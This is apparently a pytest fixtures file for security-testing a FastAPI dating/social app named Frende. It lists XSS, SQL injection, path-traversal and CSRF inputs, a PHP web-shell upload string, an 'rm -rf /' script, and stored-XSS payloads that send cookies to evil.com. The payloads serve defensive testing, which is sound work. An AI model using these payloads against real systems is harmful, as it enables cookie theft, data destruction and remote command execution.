#!/usr/bin/env python3
"""
Security test configuration and fixtures for Frende application
"""
import pytest
import asyncio
import jwt
import hashlib
import secrets
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional
from unittest.mock import Mock, patch

from fastapi.testclient import TestClient
from sqlalchemy.ext.asyncio import AsyncSession

from core.config import settings
from core.security import create_access_token, create_refresh_token, get_password_hash
from core.database import get_async_session
from models.user import User
from main import app

# Security test data
SECURITY_TEST_DATA = {
    "xss_payloads": [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "<iframe src=javascript:alert('XSS')>",
        "data:text/html,<script>alert('XSS')</script>",
        "vbscript:alert('XSS')"
    ],
    "sql_injection_payloads": [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "1; DROP TABLE users;",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "1' AND (SELECT COUNT(*) FROM users) > 0 --",
        "admin' OR '1'='1' --"
    ],
    "csrf_payloads": [
        "<form action='http://localhost:8000/api/users/update' method='POST'>",
        "<img src='http://localhost:8000/api/users/delete' width='0' height='0'>",
        "<script>fetch('http://localhost:8000/api/users/update', {method: 'POST'})</script>"
    ],
    "path_traversal_payloads": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    ],
    "weak_passwords": [
        "password",
        "123456",
        "qwerty",
        "admin",
        "letmein",
        "welcome",
        "monkey",
        "dragon",
        "master",
        "football"
    ],
    "invalid_emails": [
        "test@",
        "@example.com",
        "test..test@example.com",
        "test@.com",
        "test@example..com",
        "test@example",
        "test@@example.com",
        "test@example.com.",
        ".test@example.com"
    ]
}

@pytest.fixture
def security_test_data() -> Dict[str, List[str]]:
    """Provide security test data"""
    return SECURITY_TEST_DATA

@pytest.fixture
def test_client() -> TestClient:
    """Create test client for security testing"""
    return TestClient(app)

@pytest.fixture
async def security_test_user(async_session: AsyncSession) -> User:
    """Create a test user for security testing"""
    user = User(
        email="security.test@example.com",
        hashed_password=get_password_hash("SecurePassword123!"),
        is_active=True,
        is_verified=True,
        name="Security Test User",
        age=25,
        profession="Security Tester",
        profile_text="Security testing profile",
        interests="security,testing,cybersecurity",
        community="Technology",
        location="San Francisco",
        age_preference_min=20,
        age_preference_max=30,
        coins=100
    )
    async_session.add(user)
    await async_session.commit()
    await async_session.refresh(user)
    return user

@pytest.fixture
async def security_test_user_token(security_test_user: User) -> str:
    """Create a valid JWT token for security testing"""
    return create_access_token(
        data={"sub": str(security_test_user.id), "email": security_test_user.email}
    )

@pytest.fixture
async def security_test_user_refresh_token(security_test_user: User) -> str:
    """Create a valid refresh token for security testing"""
    return create_refresh_token(
        data={"sub": str(security_test_user.id), "email": security_test_user.email}
    )

@pytest.fixture
async def expired_token(security_test_user: User) -> str:
    """Create an expired JWT token for security testing"""
    return create_access_token(
        data={"sub": str(security_test_user.id), "email": security_test_user.email},
        expires_delta=timedelta(seconds=-1)
    )

@pytest.fixture
async def invalid_token() -> str:
    """Create an invalid JWT token for security testing"""
    return "invalid.token.here"

@pytest.fixture
async def tampered_token(security_test_user: User) -> str:
    """Create a tampered JWT token for security testing"""
    token = create_access_token(
        data={"sub": str(security_test_user.id), "email": security_test_user.email}
    )
    # Tamper with the token by changing the payload
    parts = token.split('.')
    if len(parts) == 3:
        # Decode and modify the payload
        import base64
        import json
        payload = json.loads(base64.b64decode(parts[1] + '==').decode('utf-8'))
        payload['email'] = 'hacker@example.com'
        tampered_payload = base64.b64encode(json.dumps(payload).encode('utf-8')).decode('utf-8').rstrip('=')
        parts[1] = tampered_payload
        return '.'.join(parts)
    return token

@pytest.fixture
async def multiple_test_users(async_session: AsyncSession) -> List[User]:
    """Create multiple test users for security testing"""
    users = []
    for i in range(5):
        user = User(
            email=f"security.test{i}@example.com",
            hashed_password=get_password_hash(f"SecurePassword{i}!"),
            is_active=True,
            is_verified=True,
            name=f"Security Test User {i}",
            age=25 + i,
            profession=f"Security Tester {i}",
            profile_text=f"Security testing profile {i}",
            interests="security,testing,cybersecurity",
            community="Technology",
            location="San Francisco",
            age_preference_min=20,
            age_preference_max=30,
            coins=100
        )
        users.append(user)
        async_session.add(user)
    
    await async_session.commit()
    for user in users:
        await async_session.refresh(user)
    return users

@pytest.fixture
def malicious_headers() -> Dict[str, str]:
    """Provide malicious headers for security testing"""
    return {
        "X-Forwarded-For": "192.168.1.1",
        "X-Real-IP": "10.0.0.1",
        "User-Agent": "Mozilla/5.0 (compatible; SecurityBot/1.0)",
        "X-Requested-With": "XMLHttpRequest",
        "X-CSRF-Token": "malicious-token",
        "X-XSS-Protection": "0",
        "X-Content-Type-Options": "nosniff",
        "Referer": "http://malicious-site.com",
        "Origin": "http://malicious-site.com"
    }

@pytest.fixture
def security_test_config() -> Dict[str, Any]:
    """Provide security test configuration"""
    return {
        "rate_limit_threshold": 5,
        "max_request_size": 10 * 1024 * 1024,  # 10MB
        "max_upload_size": 30 * 1024 * 1024,   # 30MB
        "session_timeout": 1440,  # 24 hours in minutes
        "password_min_length": 8,
        "password_require_special": True,
        "password_require_number": True,
        "password_require_uppercase": True,
        "max_login_attempts": 5,
        "lockout_duration": 15,  # minutes
        "csrf_token_expiry": 3600,  # 1 hour in seconds
        "jwt_expiry": 1440,  # 24 hours in minutes
        "refresh_token_expiry": 10080,  # 7 days in minutes
    }

@pytest.fixture
def security_monitor_mock():
    """Mock security monitor for testing"""
    with patch('core.security_middleware.security_logger') as mock_logger:
        yield mock_logger

@pytest.fixture
def rate_limit_mock():
    """Mock rate limiting for testing"""
    with patch('core.security_middleware.RateLimitMiddleware') as mock_rate_limit:
        yield mock_rate_limit

@pytest.fixture
def websocket_auth_mock():
    """Mock WebSocket authentication for testing"""
    with patch('core.websocket_auth.WebSocketAuthManager') as mock_auth:
        yield mock_auth

@pytest.fixture
def security_validator_mock():
    """Mock security validator for testing"""
    with patch('core.security_utils.SecurityValidator') as mock_validator:
        yield mock_validator

@pytest.fixture
def security_test_scenarios() -> Dict[str, Dict[str, Any]]:
    """Provide security test scenarios"""
    return {
        "authentication_bypass": {
            "description": "Test authentication bypass attempts",
            "payloads": [
                {"Authorization": ""},
                {"Authorization": "Bearer "},
                {"Authorization": "Bearer invalid.token.here"},
                {"Authorization": "Basic dXNlcjpwYXNz"},
                {"X-API-Key": "invalid-key"},
            ]
        },
        "session_hijacking": {
            "description": "Test session hijacking attempts",
            "payloads": [
                {"Cookie": "session=malicious-session-id"},
                {"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"},
            ]
        },
        "privilege_escalation": {
            "description": "Test privilege escalation attempts",
            "payloads": [
                {"X-User-Role": "admin"},
                {"X-User-Permissions": "all"},
                {"X-User-ID": "1"},
                {"X-Admin": "true"},
            ]
        },
        "data_exfiltration": {
            "description": "Test data exfiltration attempts",
            "payloads": [
                {"Accept": "application/json"},
                {"X-Requested-With": "XMLHttpRequest"},
                {"Content-Type": "application/json"},
            ]
        }
    }

@pytest.fixture
def security_headers_test_data() -> Dict[str, Dict[str, str]]:
    """Provide security headers test data"""
    return {
        "expected_headers": {
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "X-XSS-Protection": "1; mode=block",
            "Referrer-Policy": "strict-origin-when-cross-origin",
            "Permissions-Policy": "geolocation=(), microphone=(), camera=()",
        },
        "missing_headers": [
            "X-Frame-Options",
            "X-Content-Type-Options",
            "X-XSS-Protection",
            "Referrer-Policy",
        ],
        "weak_headers": {
            "X-Frame-Options": "SAMEORIGIN",
            "X-XSS-Protection": "0",
            "Referrer-Policy": "no-referrer",
        }
    }

@pytest.fixture
def cors_test_data() -> Dict[str, Any]:
    """Provide CORS test data"""
    return {
        "allowed_origins": [
            "http://localhost:3000",
            "http://localhost:5173",
            "http://127.0.0.1:5173",
        ],
        "disallowed_origins": [
            "http://malicious-site.com",
            "https://evil.com",
            "http://localhost:8080",
            "http://192.168.1.1:3000",
        ],
        "allowed_methods": ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
        "disallowed_methods": ["TRACE", "TRACK", "CONNECT"],
        "allowed_headers": ["Authorization", "Content-Type", "Accept"],
        "disallowed_headers": ["X-Malicious-Header", "X-Evil-Header"],
    }

@pytest.fixture
def file_upload_test_data() -> Dict[str, Any]:
    """Provide file upload security test data"""
    return {
        "valid_files": [
            {"name": "profile.jpg", "content": b"fake-jpeg-content", "type": "image/jpeg"},
            {"name": "profile.png", "content": b"fake-png-content", "type": "image/png"},
        ],
        "malicious_files": [
            {"name": "malicious.php", "content": b"<?php system($_GET['cmd']); ?>", "type": "application/x-php"},
            {"name": "malicious.js", "content": b"<script>alert('XSS')</script>", "type": "application/javascript"},
            {"name": "malicious.exe", "content": b"fake-executable", "type": "application/x-executable"},
            {"name": "malicious.sh", "content": b"#!/bin/bash\nrm -rf /", "type": "application/x-sh"},
            {"name": "profile.jpg.php", "content": b"<?php system($_GET['cmd']); ?>", "type": "image/jpeg"},
            {"name": "profile.jpg;.php", "content": b"<?php system($_GET['cmd']); ?>", "type": "image/jpeg"},
        ],
        "oversized_files": [
            {"name": "large.jpg", "content": b"x" * (31 * 1024 * 1024), "type": "image/jpeg"},  # 31MB
        ],
        "path_traversal_files": [
            {"name": "../../../etc/passwd", "content": b"fake-content", "type": "text/plain"},
            {"name": "..\\..\\..\\windows\\system32\\config\\sam", "content": b"fake-content", "type": "text/plain"},
        ]
    }

@pytest.fixture
def sql_injection_test_data() -> Dict[str, List[str]]:
    """Provide SQL injection test data"""
    return {
        "authentication_bypass": [
            "admin'--",
            "admin' OR '1'='1'--",
            "admin' OR 1=1--",
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'/*",
            "admin'#",
        ],
        "data_extraction": [
            "' UNION SELECT * FROM users--",
            "' UNION SELECT username,password FROM users--",
            "' UNION SELECT 1,2,3,4,5--",
            "' ORDER BY 1--",
            "' ORDER BY 2--",
            "' GROUP BY 1--",
        ],
        "data_modification": [
            "'; DROP TABLE users--",
            "'; DELETE FROM users--",
            "'; UPDATE users SET password='hacked'--",
            "'; INSERT INTO users VALUES ('hacker','password')--",
        ],
        "blind_sql_injection": [
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "' AND (SELECT LENGTH(username) FROM users LIMIT 1) > 0--",
            "' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1) > 0--",
        ]
    }

@pytest.fixture
def xss_test_data() -> Dict[str, List[str]]:
    """Provide XSS test data"""
    return {
        "reflected_xss": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
        ],
        "stored_xss": [
            "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
            "<img src=x onerror=fetch('http://evil.com/steal?cookie='+document.cookie)>",
            "<svg onload=fetch('http://evil.com/steal?cookie='+document.cookie)>",
        ],
        "dom_xss": [
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "vbscript:alert('XSS')",
            "onload=alert('XSS')",
            "onerror=alert('XSS')",
            "onclick=alert('XSS')",
        ],
        "filter_bypass": [
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert('XSS')</script>",
            "<script>alert('XSS')</script>",
            "<script>alert('XSS')</script>",
            "<script>alert('XSS')</script>",
        ]
    }

@pytest.fixture
def csrf_test_data() -> Dict[str, Any]:
    """Provide CSRF test data"""
    return {
        "csrf_tokens": [
            "valid-csrf-token-123",
            "another-valid-token-456",
            "expired-token-789",
            "invalid-token-abc",
        ],
        "csrf_payloads": [
            {
                "method": "POST",
                "url": "/api/users/update",
                "data": {"name": "Hacked User"},
                "headers": {"X-CSRF-Token": "invalid-token"}
            },
            {
                "method": "POST",
                "url": "/api/users/delete",
                "data": {"user_id": "1"},
                "headers": {"X-CSRF-Token": "expired-token"}
            },
            {
                "method": "POST",
                "url": "/api/tasks/create",
                "data": {"title": "Malicious Task"},
                "headers": {"X-CSRF-Token": "missing-token"}
            }
        ]
    }

@pytest.fixture
def benchmark_config():
    """Configure pytest-benchmark for security testing"""
    return {
        "min_rounds": 10,
        "max_rounds": 100,
        "warmup": True,
        "warmup_rounds": 5,
        "disable_gc": True,
        "timer": "time.perf_counter",
    }
